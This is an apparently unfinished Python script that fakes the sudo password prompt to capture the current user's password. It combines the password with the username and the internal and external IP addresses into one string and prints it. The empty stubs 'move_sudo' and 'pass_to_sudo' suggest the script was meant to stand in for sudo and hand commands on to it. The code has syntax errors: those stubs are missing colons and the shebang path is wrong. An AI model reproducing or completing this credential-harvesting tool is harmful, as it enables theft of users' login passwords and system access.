#!/usr/env/python3

from getpass import getuser, getpass
from datetime import datetime
from socket import gethostbyname_ex, gethostname, socket, AF_INET, SOCK_DGRAM
from requests import get

# edited Code from W3schools
def get_internal_ip():
    return([l for l in ([ip for ip in gethostbyname_ex(gethostname())[2] 
    if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket(AF_INET, SOCK_DGRAM)]][0][1]]) if l][0][0])

def get_external_ip():
    try:
        ip =  get('https://api.ipify.org').text
    except:
        ip = 'NA'

    return ip

def get_info():

    curr_user = getuser()
    prompt = "[sudo] password for " + curr_user + ': '
    passwd = getpass(prompt) 
    internal_ip = get_internal_ip()
    external_ip = get_external_ip()

    info = 'external_ip: <' + external_ip + '>, internal_ip:<' + internal_ip + '>, username:<' + curr_user + '>, passwd:<' + passwd +'>, ' + str(datetime.now())  

    return info
def move_sudo()
    return

def pass_to_sudo()
    return

if __name__ == '__main__':
    print(get_info())
